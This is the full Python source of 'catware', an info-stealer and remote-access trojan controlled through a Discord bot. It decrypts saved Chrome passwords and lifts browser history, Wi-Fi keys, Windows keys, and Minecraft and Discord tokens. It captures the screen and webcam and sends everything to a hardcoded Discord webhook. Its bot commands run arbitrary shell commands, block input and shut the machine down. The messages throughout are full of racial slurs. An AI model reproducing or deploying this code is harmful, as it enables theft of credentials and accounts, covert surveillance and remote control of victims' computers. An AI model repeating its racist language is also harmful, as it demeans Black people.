import discord
from discord.ext import commands, tasks
import ctypes
from ctypes import windll
import os
from PIL import ImageGrab
import cv2
from dhooks import Webhook, File
from urllib.request import Request, urlopen
import requests
import platform   
import psutil
from datetime import timezone, datetime, timedelta
import socket 
from subprocess import Popen, PIPE
from getmac import get_mac_address as gm
from ip2geotools.databases.noncommercial import DbIpCity
import subprocess
import json
import getpass as gp
import sqlite3 
import shutil
import win32crypt
import base64   
from Crypto.Cipher import AES
import re
from json import loads
from win32crypt import CryptUnprotectData
import codecs
import sys
import pyautogui

embedcolor = 000000

if hasattr(sys, 'real_prefix'): # Detect if user is on VM [Debug/Bypassing program]
    print("VM Detected!")
    exit()
class Hook:
    def GetHOOK():
        webhook = "https://discord.com/api/webhooks/928565743061192744/CVCdNka-ykBHX9JyllcrtSNQ2eK4Taha1qfupAuzYTZFTyC4nmAORnkfv-bw1OcI3zPM"
        return webhook

    def SendHOOK(data):
        response = requests.post(Hook.GetHOOK(), json=data)
def EncryptionKey():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

def DecryptPass(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""

def GetWiFi():
        try:
                wifidata = []
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                for i in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        try:
                            wifidata.append('{:} - {:}'.format(i, results[0]))
                        except IndexError:
                            wifidata.append('{:} - {:}'.format(i, "No Password"))
                    except subprocess.CalledProcessError:
                        wifidata.append('{:} - {:}'.format(i, "ENCODING ERROR"))
                return wifidata
        except:
	        return "Wifi Password Error"
def GetHWID():
            cmd = 'wmic csproduct get uuid'
            uuid = os.popen(cmd).read()
            pos1 = uuid.find("\n")+2
            uuid = uuid[pos1:-1]
            return uuid.rstrip()
def GetWINKey():
    p = Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
    winkey = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
    return winkey
def GetLocalIP():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('10.255.255.255', 1))
            localip = s.getsockname()[0]
            s.close()
            return localip
def GetIP():
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    return ip
def TakeScreenshot():
            screenshot = ImageGrab.grab()
            screenshot.save("C:\ProgramData\Desktop.jpg")
            screenfile = File('C:\ProgramData\Desktop.jpg', name='Desktop.jpg')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=screenfile)
            os.remove('C:\ProgramData\Desktop.jpg')
def GetLocations():
            if os.name == 'nt':
                accountlocations = [
                    f'C:\\Users\\{gp.getuser()}\\AppData\\Roaming\\.minecraft\\launcher_accounts.json',
                    f'C:\\Users\\{gp.getuser()}\\AppData\\Roaming\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
                ]
                
            else:
                accountlocations = [
                    f'\\home\\{gp.getuser()}\\.minecraft\\launcher_accounts.json',
                    f'\\sdcard\\games\\com.mojang\\',
                    f'\\~\\Library\\Application Support\\minecraft'
                    f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
                ]

            return accountlocations

def MinecraftStealer():
            accounts = []
            for location in GetLocations():
                if os.path.exists(location):
                    auth_db = json.loads(open(location).read())['accounts']

                    for d in auth_db:
                        sessionKey = auth_db[d].get('accessToken')
                        if sessionKey == "":
                            sessionKey = "None"
                        username = auth_db[d].get('minecraftProfile')['name']
                        sessionType = auth_db[d].get('type')
                        email = auth_db[d].get('username')
                        if sessionKey != None or '':
                            accounts.append("Username: " + username + ", Session: " + sessionType + ", Email: " + email + ", Token: " + sessionKey)

            if accounts == []:
                accounts = "No Minecraft Accounts Found"

            return accounts
def GetHistory():
            history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
            login_db = os.path.join(history_path, 'History')
            shutil.copyfile(login_db, "C:\ProgramData\histdb.db")
            c = sqlite3.connect("C:\ProgramData\histdb.db")
            cursor = c.cursor()
            select_statement = "SELECT title, url FROM urls"
            cursor.execute(select_statement)
            history = cursor.fetchall()
            with open('C:\ProgramData\history.txt', "w+", encoding="utf-8") as f:
                f.write('History' + '\n' + '─────────────────────[catware]─────────────────────' + '\n' + '\n')
                for title, url in history:
                    f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "\n" + "─────────────────────[catware]─────────────────────"+ "\n" + "\n")
                f.close()
            c.close()
            os.remove("C:\ProgramData\histdb.db")
            historyfile = File('C:\ProgramData\history.txt', name='History.txt')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=historyfile)
            os.remove('C:\ProgramData\history.txt')
def FetchComputer():
            ###INFO###
            uname = platform.uname()
            version = uname.version
            processor = platform.processor()
            pcuser = os.getenv("UserName")
            desktopname = os.getenv("COMPUTERNAME")
            boottime = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            hwid = GetHWID()
            localip = GetLocalIP()
            macaddress = gm(ip=localip)
            winkey = GetWINKey()

            ###IP###   
            ip = GetIP()
            ipdata = DbIpCity.get(ip, api_key='free')
            ipcountry =  ipdata.country
            ipcity = ipdata.city
            iplatlong = f"{ipdata.latitude}/{ipdata.longitude}" 
            arp = os.popen('dir').read()

            ###RAM/CPU/GPU###
            totalram = f"{round(psutil.virtual_memory().total/1000000000, 2)}GB"
            availableram = f"{round(psutil.virtual_memory().available/1000000000, 2)}GB"
            ramused = f"{round(psutil.virtual_memory().used/1000000000, 2)}GB"
            ramusage = f"{psutil.virtual_memory().percent}%"

            cpucount = psutil.cpu_count(logical=False)
            try:
                p = Popen("wmic path win32_VideoController get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
                gpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
            except:
                gpu = "None"
                
            embed = {
                "content": "",
                "embeds": [
                    {
                        "title": "Computer Information",
                        "description": "Information about the niggers PC",
                        "color": embedcolor,
                        "fields": [
                            {
                                "name": "Basic Information",
                                "value": f"```Username: {pcuser}\nPC Name: {desktopname}\nBootTime: {boottime}\nOS Version: {version}\nHWID: {hwid}\nWindows Activation Key: {winkey}```",
                                "inline": True
                            },
                            {
                                "name": f"WiFi Passwords",
                                "value": f"```{GetWiFi()}```",
                                "inline": False
                            },
                            {
                                "name": f"Minecraft Accounts",
                                "value": f"```{MinecraftStealer()}```",
                                "inline": False
                            },
                            {
                                "name": "RAM",
                                "value": f"```Total: {totalram}\nAvailable: {availableram}\nUsed: {ramused}\nUsage: {ramusage}```",
                                "inline": True
                            },
                            {
                                "name": "Miscellaneous",
                                "value": f"```CPU Cores: {cpucount}\n{gpu}\nLocal IP: {localip}\nMAC: {macaddress}```",
                                "inline": True
                            },
                            {
                                "name": "IP Information",
                                "value": f"```IP: {ip}\nCountry: {ipcountry}\nCity: {ipcity}\nCoords: {iplatlong}```",
                                "inline": False
                            }
                        ],
                        "footer": {
                            "text": "catware | I hate niggers",
                        }
                    },
                ]
            }
            Hook.SendHOOK(embed)
def GetCamera():
            try:
                camera = cv2.VideoCapture(0)
                return_value,image = camera.read()
                gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
                cv2.imwrite(f'C:\ProgramData\camera.jpg',image)
                camera.release()
                cv2.destroyAllWindows()
                camerafile = File('C:\ProgramData\camera.jpg', name='Camera.jpg')
                fileurl = Webhook(Hook.GetHOOK())
                fileurl.send(file=camerafile)
                os.remove('C:\ProgramData\camera.jpg')
            except:
                photo_data = "No Camera Detected"

def ScrapeWindows():
            f = open("C:\ProgramData\scrapepc.txt", "w+", encoding="utf-8")
            scrapecmds={
                "Current User":"whoami /all",
                "Local Network":"ipconfig /all",
                "FireWall Config":"netsh firewall show config",
                "Online Users":"quser",
                "Local Users":"net user",
                "Admin Users": "net localgroup administrators",
                "Anti-Virus Programs":r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
                "Port Information":"netstat -ano",
                "Routing Information":"route print",
                "Hosts":"type c:\Windows\system32\drivers\etc\hosts",
                "WIFI Networks":"netsh wlan show profile",
                "Startups":"wmic startup get command, caption",
                "DNS Records":"ipconfig /displaydns",
                "User Group Information":"net localgroup",
            }   
            for key,value in scrapecmds.items():
                f.write('\n─────────────────────[%s]─────────────────────'%key)
                cmd_output = os.popen(value).read()
                f.write(cmd_output)
            f.close()
            scrapewin_file = File('C:\ProgramData\scrapepc.txt', name='PC Scrape.txt')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=scrapewin_file)
            os.remove('C:\ProgramData\scrapepc.txt')

def PasswordStealer():
            f = open('C:\ProgramData\chrome.txt', 'a+', encoding="utf-8")
            key = EncryptionKey()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            f.write(f"PASSWORDS FOUND!\n")
            for row in cursor.fetchall():
                origin_url = row[0] 
                action_url = row[1]
                username = row[2]
                password = DecryptPass(row[3], key)
                date_created = row[4]
                date_last_used = row[5]        
                if username or password:
                    f.write("─────────────────────────[catware]─────────────────────────\n \nUSER:: %s \nPASS:: %s \nFROM:: %s \n \n" % (username, password, origin_url))
                else:
                    continue
            f.close()
            victimpass = File('C:\ProgramData\chrome.txt', name='Passwords.txt')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=victimpass)
            os.remove('C:\ProgramData\chrome.txt')
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass
def ConstructLogin(token):
            return '''
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}
login("''' + token + '''")'''
def TokenSearch(path): 
            path += '\\Local Storage\\leveldb'
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token not in tokens:
                                tokens.append(token)
            return tokens

def GetHeaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return 


def UserData(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=GetHeaders(token))).read().decode())
            except:
                pass

def ConstructLogin(token):
            return '''
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}
login("''' + token + '''")'''
def PaymentCheck(token):
            try:
                return bool(requests.get(f'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=GetHeaders(token)))
            except:
                pass

def FetchTokens():
            saved_accounts = []
            saved_tokens = []
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')

            paths = {
                "Discord"               : roaming + "\\Discord",
                "Discord Canary"        : roaming + "\\discordcanary",
                "Discord PTB"           : roaming + "\\discordptb",
                "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
                "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
                "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
                'Lightcord'             : roaming + "\\Lightcord",
                'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
                'Amigo'                 : local + "\\Amigo\\User Data",
                'Torch'                 : local + "\\Torch\\User Data",
                'Kometa'                : local + "\\Kometa\\User Data",
                'Orbitum'               : local + "\\Orbitum\\User Data",
                'CentBrowser'           : local + "\\CentBrowser\\User Data",
                '7Star'                 : local + "\\7Star\\7Star\\User Data",
                'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
                'Vivaldi'               : local + "\\Vivaldi\\User Data\\Default",
                'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
                'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
                'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
                'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
                'Iridium'               : local + "\\Iridium\\User Data\\Default\\Local Storage\\leveld"
            }

            for platform, path in paths.items():
                if not os.path.exists(path):
                    continue

                tokens = TokenSearch(path)

                if len(tokens) > 0:
                    for token in tokens:
                        request_header = {'Authorization': token, 'Content-Type': 'application/json'} 
                        response = requests.get(f'https://discord.com/api/v9/users/@me', headers=request_header)
                        if response.status_code == 200:
                            user = response.json()['username']
                            discriminator = response.json()['discriminator']
                            if f"{user}#{discriminator}" not in saved_accounts:
                                saved_accounts.append(f"{user}#{discriminator}")
                                saved_tokens.append(token)

            for token in saved_tokens:
                request_header = {'Authorization': token, 'Content-Type': 'application/json'} 
                response = requests.get(f'https://discord.com/api/v9/users/@me', headers=request_header)
                if response.status_code == 200:



                    if response.json()['verified'] == True:
                        emailcheck = "Verified"
                    elif response.json()['verified'] == False:
                        emailcheck = "Not Verified"

                    logintext = ConstructLogin(token)
	

		
                    # Discord Account Information Variables
                    id = response.json()['id']
                    ip = GetIP()
                    bio = response.json()['bio']
                    email = response.json()['email']
                    phone = response.json()['phone']
                    user = response.json()['username']
                    avatarid = response.json()['avatar']
                    nsfw = response.json()['nsfw_allowed']
                    mfa_check = response.json()['mfa_enabled']
                    user_data = UserData(token)
                    discriminator = response.json()['discriminator']

                    av_gif = requests.get(f"https://cdn.discordapp.com/avatars/{id}/{avatarid}.gif").status_code
                    if av_gif == 200:
                        avatarlogo = f"https://cdn.discordapp.com/avatars/{id}/{avatarid}.gif"
                    else:
                        avatarlogo = f"https://cdn.discordapp.com/avatars/{id}/{avatarid}.png"

                        # Discord Account Embed [with loginscript]
                        embed = {
                            "content": f"<:munapea:927651098532139008> @everyone fucking nigger has niggered",
                            "embeds": [
                                {
                                    "title": "Discord Account",
                                    "color": embedcolor,
                                    "fields": [
                                        {
                                            "name": "Account Details",
                                            "value": f"```Email: {email}\nPhone: {phone}```",
                                            "inline": True
                                        },
                                        {
                                            "name": "Account Settings",
                                            "value": f"```Email: {emailcheck}\n2FA: {mfa_check}\nNSFW: {nsfw}```",
                                            "inline": False
                                        },
                                        {
                                            "name": "Login Script",
                                            "value": f"```js\n{logintext}```",
                                            "inline": False
                                        },
                                        {
                                            "name": "Account Token",
                                            "value": f"```{token}```"
                                        }
                                    ],
                                    "footer": {
                                        "text": f"Account: {user}#{discriminator} | {id} | {ip} ",
                                        "icon_url": avatarlogo
                                    }
                                }
                            ]
                        }
                        Hook.SendHOOK(embed)
def networklol():
    os.system('arp -a > C:\ProgramData\localnetwork.txt')
    victimnet = File('C:\ProgramData\localnetwork.txt', name='Network.txt')
    fileurl = Webhook(Hook.GetHOOK())
    fileurl.send(file=victimnet)
    os.remove('C:\ProgramData\localnetwork.txt')


def Startbot():
    catware = commands.Bot(command_prefix="nig.", help_command=None)
    embedcolor = 000000

    @catware.command()
    async def admincheck(ctx):
        try:
            admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if admin == True:
                embed = discord.Embed(title = "catware", color=embedcolor)
                embed.add_field(name = "admincheck", value = "catware has admin privileges: `TRUE` <:916085154739519549:927653680533098496>",  inline=False)
                await ctx.send(embed = embed)
            elif admin == False:
                embed = discord.Embed(title = "catware", color=embedcolor)
                embed.add_field(name = "admincheck", value = "catware has admin privileges: `FALSE`",  inline=False)
                await ctx.send(embed = embed)
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)   
    @catware.command()
    async def screenshot(ctx):
        try:
            screenshot = ImageGrab.grab()
            screenshot.save("C:\ProgramData\Desktop.jpg")
            await ctx.send(file=discord.File(fr'C:\ProgramData\Desktop.jpg'))
            os.remove('C:\ProgramData\Desktop.jpg')
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)   
    @catware.command()
    async def camera(ctx):
        try:
            camera = cv2.VideoCapture(0)
            return_value,image = camera.read()
            gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
            cv2.imwrite(f'C:\ProgramData\Camera.jpg',image)
            camera.release()
            cv2.destroyAllWindows()
            await ctx.send(file=discord.File(fr'C:\ProgramData\Camera.jpg'))
            os.remove('C:\ProgramData\Camera.jpg')
        except:
            embed = discord.Embed(title = f"catware", color=embedcolor)
            embed.add_field(name = "camera", value = "```No Camera Detected!```",  inline=False)
            await ctx.send(embed = embed)

    @catware.command()
    async def saymessage(ctx, message):
        try:
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message)
            embed = discord.Embed(title = f"catware", color=embedcolor)
            embed.add_field(name = f"{message}", value = f"```Voiced Successfully!```",  inline=False)
            await ctx.send(embed = embed)
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)
    @catware.command()
    async def tasks(ctx):
        try:
                    taskdata = os.popen('tasklist').read()
                    os.system('echo tasklist > C:\\ProgramData\\taskdata.txt')
                    f = open("C:\\ProgramData\\taskdata.txt", "w")
                    f.write(taskdata)
                    f.close()
                    embed = discord.Embed(title = f"catware", color=embedcolor)
                    embed.add_field(name = "tasks", value = "```Tasks Logged Successfully```",  inline=False)
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\taskdata.txt'))
                    os.remove('C:\\ProgramData\\taskdata.txt') 
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)          
    @catware.command()
    async def help(ctx):
        embed = discord.Embed(title = f"I hate niggers menu", color=000000)
        embed.add_field(name = "admincheck", value = "Checks if catware has admin",  inline= False)
        embed.add_field(name = "screenshot", value = "Takes a screenshot of the victims screen",  inline= False)
        embed.add_field(name = "camera", value = "get a image from the victims camera",  inline= False)
        embed.add_field(name = "setwallpaper", value = "sets da wallpaper",  inline= False)
        embed.add_field(name = "saymessage", value = "TTS",  inline= False)
        embed.add_field(name = "drivers", value = "get all driver info",  inline= False)
        embed.add_field(name = "messagebox", value = "send a message with a box!!",  inline= False)
        embed.add_field(name = "blockinput", value = "blocks keyboard and mouse input",  inline= False)
        embed.add_field(name = "unblockinput", value = "reenables keyboard and mouse input",  inline= False)
        embed.add_field(name = "tasks", value = "Ends a Custom Process",  inline= False)
        embed.add_field(name = "endtask [taskname]", value = "Ends a Custom Process",  inline= False)
        embed.add_field(name = "systeminfo ", value = "Sends SystemInfo",  inline= False)
        embed.add_field(name = "scrapecomputer", value = "Scrapes the victims pc",  inline= False)
        embed.add_field(name = "monitoron/off", value = "Turns the monitor on/off",  inline= False)
        await ctx.send(embed = embed)

    def MonitorOFF():
        WM_SYSCOMMAND = 274
        HWND_BROADCAST = 65535
        SC_MONITORPOWER = 61808
        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)

    def MonitorON():
        WM_SYSCOMMAND = 274
        HWND_BROADCAST = 65535
        SC_MONITORPOWER = 61808
        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
    @catware.command()
    async def blockinput(ctx):
        try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if is_admin == True:
                        try:	
                            ok = windll.user32.BlockInput(True)
                            embed = discord.Embed(title = f"catware", color=embedcolor)
                            embed.add_field(name = "blockinput", value = f"```Input has been blocked! [use unblockinput to unblock]```",  inline=False)
                            await ctx.send(embed = embed)
                        except Exception as e:
                            embed = discord.Embed(title = "catware Error", color=embedcolor)
                            embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                            await ctx.send(embed = embed)
                    else:
                        embed = discord.Embed(title = f"catware Error", color=embedcolor)
                        embed.add_field(name = "blockinput", value = f"```catware needs ADMIN Privileges for this command!```",  inline=False)
                        await ctx.send(embed = embed)
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)   
    @catware.command()
    async def unblockinput(ctx):
        try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if is_admin == True:
                        try:	
                            ok = windll.user32.BlockInput(False)
                            embed = discord.Embed(title = f"catware", color=embedcolor)
                            embed.add_field(name = "unblockinput", value = f"```Input has been unblocked!```",  inline=False)
                            await ctx.send(embed = embed)
                            
                        except Exception as e:
                            embed = discord.Embed(title = "catware Error", color=embedcolor)
                            embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                            await ctx.send(embed = embed)
                    else:
                        embed = discord.Embed(title = f"catware Error", color=embedcolor)
                        embed.add_field(name = "unblockinput", value = f"```catware needs ADMIN Privileges for this command!```",  inline=False)
                        await ctx.send(embed = embed)
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)   
    @catware.command()
    async def messagebox(ctx, message):
        try:
            os.system('powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message))
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            embed = discord.Embed(title = f"catware", color=embedcolor)
            embed.add_field(name = "messagebox", value = f"```MessageBox Shown!```",  inline=False)
            await ctx.send(embed = embed)
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)      
    @catware.command()
    async def monitoroff(ctx):
        embed = discord.Embed(title = f"catware", color=embedcolor)
        embed.add_field(name = "monitoroff", value = "```Monitor Turned off Successfully```",  inline=False)
        await ctx.send(embed = embed)
        MonitorOFF()

    @catware.command()
    async def monitoron(ctx):
        embed = discord.Embed(title = f"catware", color=embedcolor)
        embed.add_field(name = "monitoron", value = "```Monitor Turned on Successfully```",  inline=False)
        await ctx.send(embed = embed)
        MonitorON()
    @catware.command()
    async def scrapecomputer(ctx):
        try:
                    embed = discord.Embed(title = f"catware", color=embedcolor)
                    embed.add_field(name = "scrapecomputer", value = f"```Gathering & Sending Data...```",  inline=False)
                    await ctx.send(embed = embed)
                    f = open("C:\ProgramData\scrapepc.txt", "w+", encoding="utf-8")
                    scrapecmds={
                        "Current User":"whoami /all",
                        "Local Network":"ipconfig /all",
                        "FireWall Config":"netsh firewall show config",
                        "Online Users":"quser",
                        "Local Users":"net user",
                        "Admin Users": "net localgroup administrators",
                        "Anti-Virus Programs":r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
                        "Port Information":"netstat -ano",
                        "Routing Information":"route print",
                        "Hosts":"type c:\Windows\system32\drivers\etc\hosts",
                        "WIFI Networks":"netsh wlan show profile",
                        "Startups":"wmic startup get command, caption",
                        "DNS Records":"ipconfig /displaydns",
                        "User Group Information":"net localgroup",
                    }   
                    for key,value in scrapecmds.items():
                        f.write('\n─────────────────────[%s]─────────────────────'%key)
                        cmd_output = os.popen(value).read()
                        f.write(cmd_output)
                    f.close()
                    await ctx.send(file=discord.File(fr'C:\ProgramData\scrapepc.txt'))
                    os.remove('C:\ProgramData\scrapepc.txt')
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed) 

    @catware.command()
    async def drivers(ctx):
        try:
            driverinfo = os.popen('DRIVERQUERY').read()
            os.system('echo cmd > C:\\ProgramData\\driverdata.txt')
            f = open("C:\\ProgramData\\driverdata.txt", "w")
            f.write(driverinfo)
            f.close()
            embed = discord.Embed(title = f"catware", color=embedcolor)
            embed.add_field(name = "drivers", value = "```Sending Drivers File...```",  inline=False)
            await ctx.send(embed = embed)
            await ctx.send(file=discord.File(r'C:\\ProgramData\\driverdata.txt'))
            os.remove('C:\\ProgramData\\driverdata.txt')
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed) 

    @catware.command()
    async def setwallpaper(ctx):
        try:
            path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
            await ctx.message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            embed = discord.Embed(title = f"catware", color=embedcolor)
            embed.add_field(name = "setwallpaper", value = f"```Wallpaper Set Successfully!```",  inline=False)
            await ctx.send(embed = embed)
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)  

    @catware.command()
    async def systeminfo(ctx):
        try:
            driverinfo = os.popen('SYSTEMINFO').read()
            os.system('echo cmd > C:\\ProgramData\\systeminfo.txt')
            f = open("C:\\ProgramData\\systeminfo.txt", "w")
            f.write(driverinfo)
            f.close()
            embed = discord.Embed(title = f"catware", color=embedcolor)
            embed.add_field(name = "systeminfo", value = "```Gathering & Sending Data...```",  inline=False)
            await ctx.send(embed = embed)
            await ctx.send(file=discord.File(r'C:\\ProgramData\\systeminfo.txt'))
            os.remove('C:\\ProgramData\\systeminfo.txt')
        except:
            startembed = discord.Embed(title = f"catware error", description= "I HATED NIGGERS SO MUCH I ECOUNTERED AN ERROR" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            await ctx.send(embed = startembed)  
    @catware.command()
    async def console(ctx, command):
        os.system(f'cmd /k "{command}"')

    @catware.command()
    async def winshutdown(ctx):
        os.system("shutdown /p")

    @catware.command()
    async def mousehuj(ctx, time):
        while time !=0:
    
            pyautogui.moveTo(500, 750)
            pyautogui.moveTo(1300, 750)
            pyautogui.moveTo(1300, 200)
            pyautogui.moveTo(100, 200)
            time-=1
    
    @catware.command()
    async def endtask(ctx, taskname):
                    try:
                        os.system('taskkill /im ' + taskname + ' /f')
                        embed = discord.Embed(title = f"catware", color=embedcolor)
                        embed.add_field(name = f"{taskname}", value = f"```Successfully Ended: {taskname}```",  inline=False)
                        await ctx.send(embed = embed)
                    except Exception as e:
                        embed = discord.Embed(title = "catware Error", color=embedcolor)
                        embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                        await ctx.send(embed = embed)
    @catware.event
    async def on_ready():
        channel = catware.get_channel(927237453037846569)
        startembed = discord.Embed(title = f"Nigger hunter activated", color=000000)
        startembed.set_thumbnail(url="https://media.discordapp.net/attachments/927237453037846569/927650480845385758/Statistics.png")
        startembed.add_field(name = '\n<:lololol:927651008170049547> NIGGERSS', value =  "I hate niggers and it seems like a nigger has started his pc hihiha"  ,inline= False)
        startembed.add_field(name = '<:meloonium:927650997579419708> How to nigger', value =  "To start niggering use a very niggering command > **niggerhelp**"  ,inline= False)
